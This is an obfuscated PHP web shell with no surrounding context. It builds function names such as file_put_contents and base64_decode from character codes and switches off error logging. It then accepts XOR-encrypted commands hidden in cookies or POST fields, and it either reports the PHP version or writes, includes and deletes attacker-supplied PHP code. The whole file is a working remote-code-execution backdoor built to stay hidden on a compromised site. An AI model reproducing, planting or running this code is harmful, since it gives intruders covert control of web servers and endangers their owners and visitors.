<?php $xztnpxhj = chr(1037-935).'i'."\x6c"."\145"."\x5f".'p'.'u'."\164"."\x5f".chr(347-248).chr(111).'n'.'t'.chr(843-742)."\156".chr(116).chr(288-173);
$asjnuqvx = 'b'.chr(97)."\x73".chr(101)."\x36"."\64".chr(652-557).chr(100).chr(467-366)."\143"."\x6f"."\x64"."\x65";
$iilavm = "\x69".'n'."\151".chr(960-865).chr(115).chr(101).chr(794-678);
$kwgamxvtpt = "\165"."\156".chr(489-381).'i'.chr(110).'k';


@$iilavm("\145".chr(114)."\162".chr(874-763).'r'."\x5f"."\x6c"."\x6f".chr(162-59), NULL);
@$iilavm("\154".chr(111)."\x67"."\x5f".chr(900-799).chr(114).'r'."\157".'r'.chr(715-600), 0);
@$iilavm('m'.chr(97).'x'."\137".'e'.chr(120).chr(757-656).'c'.chr(117).chr(116).chr(105).chr(156-45).chr(1026-916)."\137"."\x74".chr(320-215)."\x6d"."\x65", 0);
@set_time_limit(0);

function zoqxxsztag($wkaqk, $dsjatc)
{
    $fszonqswgg = "";
    for ($gbvwe = 0; $gbvwe < strlen($wkaqk);) {
        for ($j = 0; $j < strlen($dsjatc) && $gbvwe < strlen($wkaqk); $j++, $gbvwe++) {
            $fszonqswgg .= chr(ord($wkaqk[$gbvwe]) ^ ord($dsjatc[$j]));
        }
    }
    return $fszonqswgg;
}

$gzpbuczk = array_merge($_COOKIE, $_POST);
$qxpzlfs = 'beb5cb99-a2f0-4170-8114-2f906da8f845';
foreach ($gzpbuczk as $hloyk => $wkaqk) {
    $wkaqk = @unserialize(zoqxxsztag(zoqxxsztag($asjnuqvx($wkaqk), $qxpzlfs), $hloyk));
    if (isset($wkaqk["\141".chr(700-593)])) {
        if ($wkaqk["\x61"] == chr(105)) {
            $gbvwe = array(
                'p'."\166" => @phpversion(),
                's'."\x76" => "3.5",
            );
            echo @serialize($gbvwe);
        } elseif ($wkaqk["\x61"] == chr(101)) {
            $tekrqv = "./" . md5($qxpzlfs) . "\x2e".chr(105)."\156".chr(196-97);
            @$xztnpxhj($tekrqv, "<" . '?'.'p'."\150"."\160"."\40"."\x40".'u'.'n'.chr(108).chr(105).chr(634-524)."\x6b"."\x28".chr(627-532).chr(343-248).'F'.chr(73).chr(76).chr(602-533).chr(146-51).chr(704-609).chr(41)."\73".chr(293-261) . $wkaqk[chr(100)]);
            @include($tekrqv);
            @$kwgamxvtpt($tekrqv);
        }
        exit();
    }
}

